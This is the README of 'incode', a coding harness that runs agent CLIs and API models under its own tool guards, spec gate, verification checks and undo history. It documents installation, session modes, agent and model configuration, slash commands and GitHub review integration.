<div align="center">
<p align="center">
  <picture>
    <source media="(prefers-color-scheme: dark)" srcset="/assets/incode-logo-dark.svg">
    <source media="(prefers-color-scheme: light)" srcset="/assets/incode-logo-light.svg">
    <img alt="INCORD" src="/assets/incode-logo-light.svg" width="840">
  </picture>
</p>
</div>

`incode` — an autonomous coding harness. It plans work, has a model do it, runs
every tool the model calls through its own guards, and proves the work was done
before it calls it done.

**incode is the harness.** The coding-agent CLIs you already have and are logged
in to — `claude`, `codex` and `agy` — are used only as models, run headless on
your own subscriptions. The loop's tools, the permission checks, the undo
history, the memory hooks and the record of what happened are incode's own.
(Today that is fully true for `claude`, and for `codex` when you opt in; `codex`
by default and `agy` still run their own tools — see [Limits](#limits).)

---

## Contents

- [What it does](#what-it-does)
- [How it is built](#how-it-is-built)
- [Requirements](#requirements) · [Install](#install) · [Quick start](#quick-start)
- [A new project](#a-new-project)
- [Modes](#modes)
- [Choosing agents and models](#choosing-agents-and-models)
- [Commands inside a session](#commands-inside-a-session) · [Custom commands and plugins](#custom-commands-and-plugins)
- [Code review and GitHub](#code-review-and-github)
- [Tools](#tools)
- [Computer use](#computer-use)
- [Safety](#safety)
- [Incord Memory integration](#incord-memory-integration)
- [User-defined sub-agents](#user-defined-sub-agents)
- [Configuration](#configuration)
- [Security notes](#security-notes)
- [Limits](#limits)
- [Development](#development) · [Contributing](#contributing) · [Licence](#licence)

---

## What it does

- **Uses your subscriptions as models.** A turn goes to an installed agent CLI
  that authenticates itself. incode reads, holds and sends none of those
  logins. The CLI is started with its own tools, hooks and settings switched
  off, and is handed incode's tools instead.
- **Runs every tool itself.** Each call the model makes passes one gate in
  incode's `Toolbox`: schema check, the protected-path guards, the permission
  mode, the operator's hooks, the memory engine's pre-tool check, a checkpoint,
  then the tool.
- **Refuses to code an unspecified project.** About, Goals, Synopsis, PRD and a
  roadmap must exist before a source file may be written, and so must the spec
  set — an architecture with its `## Layout`, the contracts, the conventions,
  the verification commands and the assumptions. On an existing codebase it
  reads the code first and asks only what the code cannot answer.
- **Proves completion.** A task reaches `Done` only through a command that
  exited zero. No model's report — however confident, from whichever model —
  reaches that state.
- **Protects the exam.** Tests, CI config, migrations, `.env` files and the
  ledger are refused as write targets. An agent that can edit its own tests will
  eventually make a failing one pass by editing it.
- **Routes by role.** Reading and renaming go to a cheap model; judgement goes to
  an expensive one. You decide which, per role, with `/roles`.
- **Bounds the spend.** A token ceiling stops the next request. What was spent is
  always counted in full, including the request that crossed the line.
- **Undoes a turn.** Each turn's "before" is kept on disk; `/undo` restores what
  that turn changed, `/rewind <n>` goes back n turns, and both work after a
  restart.
- **Diffs against past code.** `/diff` compares a file or the workspace with an
  older revision, commit or file.
- **Remembers across sessions.** Context, standing rules, skills, already-solved
  work and audit findings come from the shared memory service, and incode fires
  that service's session hooks itself.
- **Compresses verification logs.** Repeated lines and passing-test noise are
  collapsed before a failure report reaches a model; errors and panics are kept.
- **Drives a desktop, when you turn it on.** [Computer use](#computer-use) on
  Windows, macOS and Linux (X11): the model reads a window's accessibility tree
  and acts on named controls, falling back to screenshots and pixels — through
  the same gate as every other tool, with password managers never read, pictured
  or touched.
- **Reaches models with a key, too.** Besides the CLIs, any Anthropic- or
  OpenAI-format service in `admin.json` (Anthropic, Z.ai, OpenRouter, …), run
  by incode's own tool loop with prompt caching and retries on a busy service.

## How it is built

```
                    ┌──────────────────────────────┐
                    │           incode             │
                    │ plan · ledger · check · undo │
                    │   Toolbox: every tool call   │
                    └──────┬───────────────┬───────┘
      headless, as a model │               │ HTTP on 127.0.0.1
                           ▼               ▼
            ┌───────────────────────┐   ┌──────────────────────────┐
            │ claude / codex / agy  │   │ Incord Memory (optional) │
            │ (your subscriptions)  │   │ recall · rules · recorder│
            └───────────┬───────────┘   │ auditor · owner channel  │
                        │ tool calls    └──────────────────────────┘
                        ▼
              incode --tool-server ──► back to the parent incode's Toolbox
```

1. **Plan (`src/plan.rs`).** An expensive model reads the brief and PRD and
   splits roadmap items into role-tagged tasks (`plan::split`).
2. **Execute by role (`src/roles.rs`).** Each task runs on the models its role
   names — cheap ones for `grunt` and `explore`, stronger ones for `plan` and
   `review` — with an ordered fallback.
3. **Attribution (`src/identity.rs`, `src/ledger.rs`).** Every attempt, pass or
   fail, is recorded with the worker's identity (`backend:role` plus a stable
   fingerprint, and the model that actually answered) on the ledger task, and
   finished work is written to the shared memory under
   `<project>#<fingerprint>`.
4. **Proof (`src/verify.rs`).** `verify::Verified` can only be built from a
   process that exited zero. A failed check puts the task back with its failure
   note, compacted by `verify::compact_log`; after `MAX_ATTEMPTS` (2) it is
   abandoned rather than retried forever.
5. **Parallel lanes (`src/parallel.rs`).** With `INCODE_LANES` above 1 and a git
   repository, tasks run in separate git worktrees; a merge conflict is never
   resolved automatically — the branch is kept and the task goes back.
6. **Fallback between agents (`src/agent/catalogue.rs`, `src/task_run.rs`).**
   The chosen agent is tried first, then every other usable local agent, then a
   configured API route, so an expired login or a usage limit on one does not
   stop the run.

The design is in `docs/ARCHITECTURE.md`; the tool layer is its §5a and §5b.

## Requirements

- **Rust 1.88+** to build — the highest `rust-version` any locked dependency
  declares. It is set in `Cargo.toml`, so cargo refuses an older toolchain by
  name.
- **On Linux, system development packages** to build. Measured by building
  on a clean Debian 13 image; the same names install on Ubuntu 24.04:

  ```sh
  sudo apt install pkg-config libssl-dev \
    libclang-dev libwayland-dev libegl-dev libgbm-dev libpipewire-0.3-dev libxcb1-dev
  ```

  The first line is for HTTPS. The second is the screen-capture library's,
  for computer use: it builds a Wayland and PipeWire backend even though
  incode drives X11 only. A server that never runs computer use can skip it
  by building without the `desktop-capture` feature (see [Install](#install));
  the binary then also runs without `libgbm`, `libwayland-client` and
  `libxcb` installed.
- **At least one coding agent CLI**, installed and logged in: `claude`, `codex`
  or `agy`. `/doctor` names what it found and what is missing. `gemini`,
  `opencode` and `cursor` are detected but not driven.
- **Optional:** the Incord Memory service on `http://127.0.0.1:9180` and its
  engine binary. Without them incode still works and knows less. Point
  elsewhere with `INCORD_MEMORY_URL` and `INCORD_ENGINE_BIN`.
- **Optional programs** that add tools when found: a headless browser
  installed as an [external tool](#external-tools), a Chromium-family browser
  for text PDFs, and LibreOffice for `ConvertDocument` (see [Tools](#tools)).
- **For computer use** (off unless `INCODE_DESKTOP=1`): nothing extra on
  Windows; on macOS, the Accessibility and Screen Recording grants and a
  logged-in graphical session; on Linux, an X11 display or `Xvfb`, a D-Bus
  session with `at-spi2-core` for the accessibility tree, and `xclip` or `xsel`
  for pasting. See [Computer use](#computer-use).

## Install

Prebuilt `incode` (and `sbx`, the [standalone sandbox](crates/sandbox)) for
Linux (x86_64, aarch64; glibc), macOS (Intel, Apple silicon) and Windows
(x86_64) are published on each GitHub release. The install scripts fetch the
latest one, check it against the release's `SHA256SUMS`, and install it:

```sh
# Linux / macOS — into ~/.local/bin (or $INCODE_INSTALL_DIR)
curl -fsSL https://raw.githubusercontent.com/incordai/incode/main/scripts/install.sh | sh
```

```powershell
# Windows — into %LOCALAPPDATA%\incode\bin, added to your user PATH
irm https://raw.githubusercontent.com/incordai/incode/main/scripts/install.ps1 | iex
```

Set `INCODE_VERSION=v0.2.0` to pin a release instead of the latest. Once
installed, `incode update --check` says whether a newer release exists, and
`incode update` installs it in place (sha256-checked; `sbx` is updated too when
it sits beside `incode`). The Linux binary is built with the default
`desktop-capture` feature, so it needs the shared libraries of the capture
stack (`libgbm`, `libwayland-client`, `libxcb`) present at run time; on a
server without them, build from source without that feature.

### From source

```sh
git clone <this repo> incord-code
cd incord-code
cargo build --release
```

The binary lands at `target/release/incode`. Put it on your `PATH`:

```sh
# Linux / macOS
install -m755 target/release/incode ~/.local/bin/incode

# Windows (PowerShell)
Copy-Item target\release\incode.exe $env:USERPROFILE\.local\bin\
```

**On Windows, also set up the sandbox** (`sbx`, which runs inside WSL2):

```powershell
powershell -ExecutionPolicy Bypass -File scripts\install-windows.ps1
```

It installs WSL2 if it's missing (asks first; needs administrator rights
once and usually a restart, then run it again). It then builds `sbx` inside
WSL2 and puts `sbx.exe` on your PATH. `sbx.exe` forwards every command into
WSL2, where the Linux sandbox confines it. macOS and Linux need no extra
step.

Each Outline language is a default cargo feature (`lang-rust`, `lang-ts`,
`lang-python`, `lang-go`, `lang-js`); build with `--no-default-features` and a
subset to drop grammars. Screen capture for computer use is the default
feature `desktop-capture`; leaving it out (on a server that never drives a
desktop) drops the Linux Wayland/PipeWire build dependencies, and every
screenshot is then refused by name:

```sh
cargo build --release --no-default-features \
  --features lang-rust,lang-ts,lang-python,lang-go,lang-js
```

## Quick start

```sh
incode                      # a session in the current directory; type /doctor
incode -w path/to/project   # a session in another directory
incode -t "add a health endpoint and a test for it"
INCODE_DESKTOP=1 incode     # a session that may also drive the desktop
```

## A new project

Open incode in an empty folder and its first job is the specification, not the
code. It asks at most seven questions in one batch, each with its recommended
answer marked — Enter takes it, so you type only where you disagree, and with
nobody at the prompt the recommendations stand as recorded assumptions. It
researches the rest, and writes:

| File | What it holds |
|---|---|
| `docs/PRD.md` | What is being built, with a `## Non-goals` section |
| `docs/ARCHITECTURE.md` | The stack and the modules, with a `## Layout`: the stack's official generator command (`cargo new`, `npm create vite@<version>`, `uv init`) with its verified version, and the folder tree; and a `## Language`: each term, its definition, and `_Avoid_:` the synonyms not to use |
| `.incode/contracts.json` | The shapes that cross module boundaries |
| `docs/CONVENTIONS.md` | Naming, errors, comments, tests |
| `docs/VERIFICATION.md` | The command that proves each roadmap item |
| `docs/ASSUMPTIONS.md` | Every choice made without asking, with its reason — and the only place decisions are written; no ADR files |

Writing source is refused until they exist — except in a `-t` run its caller
marked already scoped with `--spec-gate=off` ([Modes](#modes)). The roadmap then starts with
**`s1 Create the layout`**: the generator is run in the project's root as
ordinary work (every check runs from the root), and the item
counts as done only when its check in `docs/VERIFICATION.md` — the stack's build
or test command — exits zero. incode carries no templates of its own; pin the
generator you want per stack with `scaffold` in `admin.json`.

The project also gets **`.incode/.gitignore`**, written the moment incode
creates `.incode/`: it ignores this machine's state (the ledger, the cached
brief, checkpoints, transcripts, the server's token and the rest) and leaves the
files you approve — `contracts.json`, `guards.json`, `agents/*.md` — to be
committed. incode only ever adds a missing line to it; your edits stay.

**Where done and not-done lives.** One chain, no second tracker: each work
section of `docs/PRD.md` — not About, Goals, Synopsis, or the non-goals,
assumptions, risks and scope — becomes a roadmap item (`d1`, `d2`, … after
`s1`); the
planner splits an item into tasks in `.incode/ledger.json`, each carrying that
item's id and reaching `Done` only through its own check; and the item itself
is reached only when its line in `docs/VERIFICATION.md` passes and every task
for it is done. `/roadmap` shows the board.

**How an item is planned.** The planner cuts it into at most twelve steps, each
a thin vertical slice its check can prove on its own; reshaping comes first when
the code fights the change, and a wide refactor goes expand → migrate in batches
→ contract. For a behaviour change the test is its own first step, written
pending so the check still passes, and the next step makes the change, turns the
test on, and is done only when the check passes with it running. Test files stay
protected, so both steps need you: a write to one is put to you as Allow or
Reject — at the terminal, in your ACP client, and during `/run` as a card in the
owner's app when `plugins.owner` is on. With nobody to ask it is refused, unless
`.incode/guards.json` lists the path under `allow_writes_to` — allowing it is you
agreeing what "done" means.

## Modes

| Invocation | What it is |
|---|---|
| `incode` | The interactive session (REPL). |
| `incode -t "<text>"` | One instruction, then exit. Needs no API credential. |
| `incode -t "<text>" --output-format stream-json` | The same, printing one JSON event per line: `init`, `text`, `thinking`, `tool_use`, `tool_result`, `usage`, `result`. stdout carries JSON only; everything else goes to stderr. |
| `incode -t "<text>" --output-format json` | The same, printing only the final `result` object. |
| `incode -t "<text>" --spec-gate=off` | The same, for a task its caller has already scoped: this run may write source without the [spec set](#a-new-project), and the prompt does not ask for it (nor for the brief). Also `INCODE_SPEC_GATE=off`; an unknown value is an error. The result line says `"spec_gate":"off"` (`"on"` otherwise), and a text run says so as it starts. The guards, the sentinel and verify still hold. Only `-t` honours it — the REPL, `/run` and `--acp` always require the spec set, and say so on stderr when the variable is set — and `admin.json` cannot set it. |
| `incode --acp` | incode as an Agent Client Protocol agent on stdin/stdout, for an editor or app. Takes `-p` (`read-only`, `workspace-write`, `danger-full-access`), `-m` and `--no-env-filter`; each `session/new` names its own workspace. |
| `incode --serve [--port N]` | A local viewer on `127.0.0.1` for what a run in this workspace is doing. Reads, plus two writes behind a per-run token in `.incode/serve.token`: stop the running `/run`, and answer an agent's question. |
| `incode --admin` | Print the resolved settings and which layer decided each. |
| `incode --desktop-stop` | Halt the desktop driving this workspace. |
| `incode --install-tools` | Download, check and unpack every [external tool](#external-tools) in `admin.json`, then exit (non-zero if any was not installed). |
| `incode update [--check]` | Install the latest release over this program, checked against its `SHA256SUMS` (see [Install](#install)); `--check` only reports whether there is one. |
| `incode completions <bash\|zsh\|fish\|powershell>` | Print a completion script for that shell: flags, the values of `-p`, `--output-format` and `--spec-gate`, the subcommands and their verbs (`mcp login`, `plugin add`, …), and file names after a path flag. Load it with `source <(incode completions bash)` (zsh: the same, after `compinit`), `incode completions fish \| source`, or in PowerShell `incode completions powershell \| Out-String \| Invoke-Expression` — in your shell's startup file to keep it. |
| `incode --tool-server` | Internal. Started by the agent CLI that incode launched; offers incode's tools over MCP and runs nothing itself. |
| `incode --desktop-mcp` | Internal. The desktop tools' executor, started by incode's toolbox. |
| `incode --team-mcp --team-channel <p>` | Internal. The team channel as an MCP server, for `codex`. |
| `incode --sandbox-exec` | Internal. The OS sandbox helper for a shell command. |

Options shared by the session modes:

```
  -m, --model <NAME>        Model to use (or set INCODE_MODEL)
  -w, --workspace <PATH>    Workspace root (default: current directory)
  -p, --permission-mode <M> read-only | workspace-write | danger-full-access | prompt | allow
      --no-env-filter       Pass the full environment to spawned commands
  -r, --resume <ID>         Continue an agent session by its id
      --add-dir <PATH>      Also work in this directory (repeatable)
  -h, --help · -V, --version
```

**Over `--acp`**, a client gets: text, reasoning and tool calls streamed as
`session/update`; edits as diffs; the task list and `/run`'s ledger as a plan;
sub-agents and `/run` lanes as sub-agent sessions (when the client advertises
them); context-window usage; `session/load` and `session/list` from incode's own
transcripts; `session/set_mode`; pickers for the lead agent and the role; a set
of slash commands; pictures in a prompt; and the client's MCP servers (stdio and
HTTP), which incode connects itself — in the background, so `session/new` does
not wait for them — and runs through the same gate as its own tools.
Details: `docs/ARCHITECTURE.md` §2.

## Choosing agents and models

incode builds one catalogue of agents at session start:

- **Local agents** found on `PATH` (`claude`, `codex`, `agy`, …) — what is
  looked for, and how each is driven, can be changed in `admin.json`
  `cli_agents` ([below](#cli-agents)).
- **API models** from `admin.json` `api_models` (below), each chosen by its
  `name`: Anthropic, Z.ai, OpenRouter or any other service, with a key. incode
  runs its own tool loop for them — its tools, guards and prompts.
- **Provider agents** from `admin.json` `api_providers` (below), as
  `<provider>/<agent>`. Driven at the provider's `turns_path` (default
  `/v1/chat/completions`), asking for the agent's id as the model.

Every route is an `admin.json` entry; no environment variable configures one.
Only keys come from the environment, from the variable each entry's `key_env`
names. (The old `INCODE_API_*` variables are no longer read: move such a setup
into one `api_models` entry.)

| Command | What it does |
|---|---|
| `/agent` | List every agent and whether it can be used, with the reason when not. |
| `/agent <id>` | Save the lead agent (`agent` in `admin.json`). |
| `/agent sub <id>` | Save the agent that works `/run`'s tasks, sequential and in lanes (`sub_agent`). `/agent sub` alone clears it; unset, it follows the lead. |
| `/roles` | Show every role, the models it resolves to, and where that came from (your choice, an `INCODE_ROLE_*` variable, or unset = the session model). |
| `/roles <role> <model\|@tier>...` | Save a role's ordered candidates (at most 8). An unknown role or tier is refused and nothing is written. |
| `/roles <role> default` | Clear a role. |
| `/model [name]` | Show or switch the session's model — on an API model, any model its service offers. |
| `/models` | List the models the current API model's service offers (its own `…/models` list, every page). |

The lead is `INCODE_AGENT`, else `admin.json` `agent`, when usable; else the
first usable local agent; else a usable API agent. Roles are `explore`,
`diagnose`, `plan`, `implement`, `review`, `frontend` and `grunt`. A candidate
may name its agent as `agent:model`; a candidate naming an agent that is not
installed is skipped. Changes apply from the next `/run` and the next session.

### API models

Each entry is one service, chosen by `name` with `/agent <name>`. Nothing about
a vendor is built into incode: these are ordinary entries you write.

```json
"api_models": [
  { "name": "anthropic", "format": "anthropic",
    "url": "https://api.anthropic.com/v1/messages", "key_env": "ANTHROPIC_API_KEY",
    "model": "claude-opus-5-5", "sub_model": "claude-haiku-4-5",
    "aliases": { "opus": "claude-opus-5-5", "sonnet": "claude-sonnet-5-5", "haiku": "claude-haiku-4-5" } },
  { "name": "zai", "format": "anthropic", "auth": "bearer",
    "url": "https://api.z.ai/api/anthropic/v1/messages", "key_env": "ZAI_API_KEY",
    "model": "glm-5.3", "sub_model": "glm-5.3-flash",
    "aliases": { "opus": "glm-5.3", "sonnet": "glm-5.3", "haiku": "glm-5.3-flash" } },
  { "name": "openrouter", "format": "openai",
    "url": "https://openrouter.ai/api/v1/chat/completions", "key_env": "OPENROUTER_API_KEY",
    "model": "anthropic/claude-opus-5.5", "sub_model": "anthropic/claude-haiku-4.5",
    "aliases": { "opus": "anthropic/claude-opus-5.5", "sonnet": "anthropic/claude-sonnet-5.5",
                 "haiku": "anthropic/claude-haiku-4.5" } }
]
```

- `format`: `anthropic` (`…/v1/messages`, `x-api-key`, `anthropic-version`)
  or `openai` (`…/chat/completions`, `Authorization: Bearer`). The conversation
  is the same either way; incode translates at the edge.
- `auth`: which header carries the key, `x-api-key` or `bearer`. Unset, the
  format's own. Z.ai's Anthropic endpoint reads a bearer token.
- `model` is the default model; `sub_model` the one its sub-agents run on (the
  `Agent` tool). A sub-agent definition or an `INCODE_ROLE_*` model still wins.
- `aliases` map the names your role table uses (`opus`, `sonnet`, `haiku`) to
  this service's ids, so one role table serves every entry — the same mapping
  Z.ai documents for Claude Code. A role candidate is taken only when the entry
  serves it (an alias, its `model` or `sub_model`, or `<name>:<id>`); one it
  serves none of leaves the default model in place rather than sending a name
  the service does not have.
- `key_env` is the **name** of the variable holding the key, never the key. The
  url must be `https`, or plain `http` to this machine; the key goes nowhere
  else.
- **Z.ai GLM Coding Plan (the subscription):** the plan's own endpoints,
  `https://api.z.ai/api/anthropic/v1/messages` (as above) or, in the `openai`
  format, `https://api.z.ai/api/coding/paas/v4/chat/completions`, with the key
  from the plan's dashboard. Pay-as-you-go is
  `https://api.z.ai/api/paas/v4/chat/completions` (`openai`).
- `max_tokens` (reply ceiling, default 8192), `max_steps` (tool rounds per
  turn, default 40) and `timeout_secs` (per request and per model-list page,
  default 300) are per entry too.
- `max_retries` (default 3; 0 never retries): how often a busy answer — 429,
  503 or 529 — is sent again. The wait is the service's `Retry-After`, else 1,
  2, 4… seconds, never more than 30 s; a wrong request (400, 401…) is never
  retried.
- `prompt_cache` (default on; `anthropic` format only): marks the tools, the
  system prompt and the newest message with `cache_control`, so each tool round
  reads the conversation so far from the service's cache. Set `false` for a
  service that refuses the field.
- `api_version`: the `anthropic-version` header the `anthropic` format sends.
  Unset, `2023-06-01`, the value that format documents.
- `context_window` (tokens, default 200000; 0 never compacts on its own): an
  API route's conversation lives in incode, so incode keeps it inside the
  window. Past 80% of it, the older turns are summarised by the same model into
  one message and the last two turns are kept verbatim (a tool call is never
  parted from its result). `/compact [instructions]` does it now, steered by
  what you ask the summary to keep. A CLI agent compacts its own transcript.
- `/model <id>` switches to any model the service offers; `/models` lists them.

### CLI agents

The agents incode looks for on `PATH` are a built-in list; `cli_agents`
changes it. An entry whose `id` is a built-in agent's changes only the fields
it sets; any other `id` adds an agent.

```json
"cli_agents": [
  { "id": "codex", "commands": ["codex-nightly"] },
  { "id": "my-agent", "display_name": "My agent", "commands": ["C:/tools/my-agent.exe"],
    "protocol": "claude-stream-json", "default_sub_agent": "my-agent" }
]
```

- `commands`: program names tried in order, or a path to the program.
- `protocol`: how it is driven — `claude-stream-json`, `codex-json`,
  `agy-stream-json`, or `unverified` (listed, never driven). An added agent
  with no protocol is `unverified`: a stream format is never guessed.
- `version_args` (default `["--version"]`), `display_name`, and
  `default_sub_agent` (the agent its work is handed to, default itself).
- An `id` holding `/` or `:` is skipped: those mark provider agents and role
  qualifiers.

### The codex route: whose tools

By default `codex` runs its own tools (`exec_command`, `apply_patch`, …) and
incode watches the result afterwards. With `"codex_tools": "incode"` in
`admin.json` (or `INCODE_CODEX_TOOLS=incode`, which wins) it is driven like
`claude`: a model only, with every tool call run by incode. `incode --admin`
shows which is in force and where it was decided. It is opt-in until a turn with
a real model has been run this way; everything below was measured on codex 0.163.0
against a stand-in model endpoint, end to end through `incode -t`.

Each turn incode opens its tool bridge and starts `codex exec --json` with:

- `--ignore-user-config` — `~/.codex/config.toml` is not read (so no MCP server
  you registered there is reachable); login still comes from `CODEX_HOME`. A
  model provider set only in that file is not used on this route.
- its tools off: `features.shell_tool=false`, `features.view_image=false`,
  `web_search="disabled"`, `features.goals=false`, `agents.enabled=false`,
  `features.multi_agent=false`, `features.apps=false`, `features.plugins=false`,
  `features.browser_use=false`, `features.computer_use=false`,
  `features.image_generation=false`,
  `tools.experimental_request_user_input.enabled=false`;
- `sandbox_mode="read-only"`, `approval_policy="never"`;
- one MCP server, `incode --tool-server`, given the bridge's address and token
  through `env_vars` (codex passes a server only the variables it is told to),
  approval mode `approve`, `required`, a one-hour call timeout, and its tools
  listed directly rather than behind codex's tool search.

What is enforced there: every file, shell, web, team, desktop and sub-agent
call is incode's, so the guards, the [permission rules](#permission-rules), a
command's `allowed-tools`, the permission mode, your hooks, the memory engine
and the [OS sandbox](#the-os-sandbox) apply to it before it runs, and the
"not enforced" notice is not shown. What is not incode's:

- `apply_patch` stays on offer — codex has no switch for it (the model catalogue
  decides). Under read-only + never codex rejects it before it runs ("patch
  rejected: writing is blocked by read-only sandbox"), so it cannot write.
- The three MCP resource readers (`list_mcp_resources`, …) stay; they read only
  what incode's server offers.
- On code-mode models (`gpt-5.6-terra`) incode's tools are reached through
  codex's own `exec`, a JavaScript sandbox without file system or network that
  calls them — each call still lands in incode.
- A project's own `.codex/config.toml` is outside `--ignore-user-config`;
  codex loads it only for a project it trusts.
- Older codex: 0.145 has no `view_image` switch and lists incode's tools behind
  its tool search; 0.153 has every switch above.

`agy` cannot be driven this way: it has no flag to switch its tools off, and
takes MCP servers only through a persistent `agy mcp add`, which would edit your
machine rather than one run.

### The API providers contract

```json
"api_providers": [{"name": "team", "url": "https://agents.example", "key_env": "TEAM_API_KEY"}]
```

- `key_env` is the **name** of an environment variable. The key is read from it
  when needed and never written to disk or printed.
- incode sends `GET {url}{agents_path}` (default `/v1/agents`) with
  `Authorization: Bearer <key>`, and allows `list_timeout_secs` (default 3).
  The url must be `https`, or plain `http` to this machine only; any other url
  is refused before the key is sent.
- The reply is `{"agents": [{"id": "coder", "name": "Coder", "model": "model-1"}]}`.
  `id` is required and unique; `name` and `model` are optional.
- Each agent's catalogue id is `<provider name>/<id>`. A provider that cannot
  be asked shows as one entry saying why.
- **A turn** for an agent goes to `POST {url}{turns_path}` (default
  `/v1/chat/completions`) in the chat-completions format, with `Authorization: Bearer <key>` and `model` set
  to the agent's `id`, streamed. Tools are `function`s; the reply's
  `tool_calls` are run by incode and answered with `tool` messages.

## Commands inside a session

| Command | What it does |
|---|---|
| `/help` | Every command, with what it does |
| `/doctor` | Whether this session can work: agents, login, guards, specs, ledger, memory |
| `/status` | Model, workspace, permission tier, tokens spent, and the ledger's progress |
| `/admin` | The resolved settings and which layer decided each |
| `/agent` · `/roles` · `/model` | Choose agents and models (above) |
| `/agents` | The user-defined sub-agents, and any definition file that was rejected |
| `/run` | Work the roadmap ledger until it is empty or something needs a person |
| `/roadmap` | What the roadmap says, and which goals a command has proven |
| `/guards` | The paths the agent is not allowed to write |
| `/permissions` | The allow / ask / deny [permission rules](#permission-rules) in force, and where each came from |
| `/links <file>` | What else uses what this file defines, and what it depends on |
| `/undo` | Put the files from the last changed turn back |
| `/rewind <n>` | Put the files back as they were n changed turns ago |
| `/diff [file] [rev]` | Unified diff of a file or the workspace against older code |
| `/plan` · `/act` | Read-only mode · workspace-write mode |
| `/review [base]` | Review the change against `base` (default: where the branch forked from origin's default branch) — see [below](#code-review-and-github) |
| `/compact [instructions]` | Summarise the older turns now (API route); a CLI agent compacts its own |
| `/image <path>` | Send a PNG or JPEG with the next message |
| `/clear` · `/save` · `/sessions` · `/resume <id>` | Session handling |
| `/remember <text>` · `/memories <query>` · `/forget <ref> [confirm]` | The shared long-term memory |
| `/skills` | The skills this session loaded from the shared store |
| `/bg <cmd>` · `/jobs` · `/kill <id>` | Background shell jobs (shared with the model's background `Bash`) |
| `/worktree [cmd]` | Git worktree create / list / remove |
| `/pr [branch] [--draft]` | Push a branch (default: the current one) and open its GitHub pull request through `gh`, or report the one already open. Refuses the default branch, uncommitted work, a branch with nothing new and a bad name, before anything is pushed. Only you run it; no tool the model calls can |
| `/pr merge [branch] [--squash\|--rebase]` | Merge that branch's open pull request (a merge commit by default; the branch is kept). Only as reviewed: refused for a draft, a conflict, a failing or still-running check, or when the PR's head is not your local branch's tip — and GitHub is told that head, so nothing pushed afterwards can ride along. Says so when no checks ran at all |
| `/add-dir <path>` | Also work in this directory — guards and undo extend to it too |
| `/tools add <name>` · `/tools update [name]` · `/tools remove <name>` | Install, update or remove an [external tool](#external-tools) (also over `--acp`) |
| `/tools` · `/mcp` · `/env` | Information screens (`/tools` also lists the external tools and what is installed) |
| `/cost` | Input, output and cache tokens per model this session, with an estimated USD figure from list prices |
| `/bug [what happened]` · `/feedback` | Print a bug report (version, OS, model, permission mode, your words) and a link to a prefilled GitHub issue. **Sends nothing and opens nothing**: tokens and your home folder are removed from what you typed, and you check the fields before filing |
| `/vim` | Toggle vi editing in the input box for this session |
| `/quit` | Exit |

### Notifications, status line, vi mode and key bindings

All optional, in `~/.incode/admin.json`:

```json
{
  "notify": "auto",
  "notify_command": "say \"$INCODE_MESSAGE\"",
  "notify_after_secs": 10,
  "statusline_command": "~/.incode/statusline.sh",
  "editing_mode": "vi"
}
```

- **`notify`** — when a turn that ran longer than `notify_after_secs` (default 10) finishes, or the agent stops to ask for permission or an answer: `auto` (default) sends an OSC 9 notification on terminals known to show one (iTerm2, WezTerm, Windows Terminal, kitty, Ghostty) and a bell elsewhere; `bell`; `desktop` (`notify-send` on Linux, `osascript` on macOS, a BurntToast or WinRT toast through PowerShell on Windows, a bell when that cannot start); `off`. `notify_command` also runs, with `INCODE_EVENT` (`done` or `input`) and `INCODE_MESSAGE` set. Nothing waits on either.
- **`statusline_command`** — run at start and after each turn with the session as JSON on stdin (`cwd`, `workspace`, `model`, `session_id`, `git_branch`, `git_dirty`, `tokens` {`input`, `output`, `cache_write`, `cache_read`, `total`}, `cost_usd`, null when a model is unpriced). Its first line replaces the facts on the input box's top rule. It gets 1.5 s; a slow or failing run keeps the last good line.
- **`output_style`** — the [output style](#output-styles) sessions start with; `INCODE_OUTPUT_STYLE` overrides it, `/style` switches it.
- **`editing_mode`** — `emacs` (default) or `vi`. In vi mode Esc enters normal mode (`h l w b e 0 ^ $ x X D C s S dd cc i a I A j k`) and Enter submits from either mode.
- **`~/.incode/keybindings.toml`** — flat `"key" = "action"` lines, checked before the built-in keys. Keys: `ctrl-`, `alt-`, `shift-` plus a character, `enter`, `tab`, `esc`, `backspace`, `delete`, arrows, `home`, `end`, `space`, `f1`–`f12`. Actions: `clear-line`, `kill-to-start`, `kill-to-end`, `delete-word`, `line-start`, `line-end`, `char-left`, `char-right`, `word-left`, `word-right`, `history-prev`, `history-next`, `newline`, `submit`, `complete`.

  ```toml
  "ctrl-l" = "clear-line"
  "alt-b" = "word-left"
  "alt-f" = "word-right"
  ```

Prices for `/cost`, the status line and `-t --output-format json` (`cost_usd`) are one table, `PRICES` in `src/runtime/usage.rs`; a model it does not know is shown as unpriced, never guessed.

## Code review and GitHub

`incode review` (and `/review` in a session) hands the model the change and
one job: report correctness bugs first, then security problems, then
simplifications, each cited as `path:line` — or say "No issues found." It
runs read-only: the agent may read the code and run nothing that writes.

```sh
incode review                     # the branch since it forked from origin's default branch, plus uncommitted and untracked work
incode review --base v0.3.0       # against any ref
incode review -p > review.md      # findings only on stdout; progress on stderr
```

The same machinery runs in CI: [`.github/actions/incode`](.github/actions/incode/action.yml)
answers `@incode` mentions on issues and pull requests (posting the reply and
pushing any change to a new branch), or reviews each pull request as it opens.
Setup, inputs and the safety defaults are in
[docs/github-action.md](docs/github-action.md).

`incode remote run "<task>"` runs a task with `incode -t` on GitHub Actions
instead of here: it dispatches the repository's `incode-remote.yml` workflow,
waits for it (60 minutes by default, `--timeout`), and prints the result as
`-t --output-format json` does, with the branch `incode/remote-<id>` the
changes were pushed to. `incode remote list` and `incode remote logs <run-id>`
show past runs. The workflow to copy, the secrets it needs and the token
`incode remote` reads (`GH_TOKEN` / `GITHUB_TOKEN`) are in
[docs/remote-runs.md](docs/remote-runs.md).

## Custom commands and plugins

A markdown file is a slash command. Put it in `.incode/commands/` (the
project's) or `~/.incode/commands/` (yours; the project's wins on a name
clash). The name is the path with `/` turned into `:` — `frontend/test.md` is
`/frontend:test`. Built-in commands always win, and a file that shadows one is
reported at start.

```markdown
---
description: Run the frontend tests for one file
argument-hint: <file> [pattern]
model: sonnet
allowed-tools: Bash(npm test:*), Read
---
Run the tests in $1, filtered to `$2`. Everything typed: $ARGUMENTS
Our test conventions: @docs/testing.md
```

`$ARGUMENTS` is everything after the name; `$1`..`$9` are its words, split like
a shell (quotes group). A body with neither gets the arguments appended. Typing
`/frontend:test app.tsx` sends the filled-in text as your turn, and `incode -t
"/frontend:test app.tsx"` runs it headless. Custom commands are listed in
`/help`, complete on Tab, and are offered to ACP clients (`incode --acp`) beside
the built-ins, with `argument-hint` as the input hint. `model` is used by `-t`
when `-m` is not given; in the REPL and over ACP it is only named, since
switching models starts the conversation over.

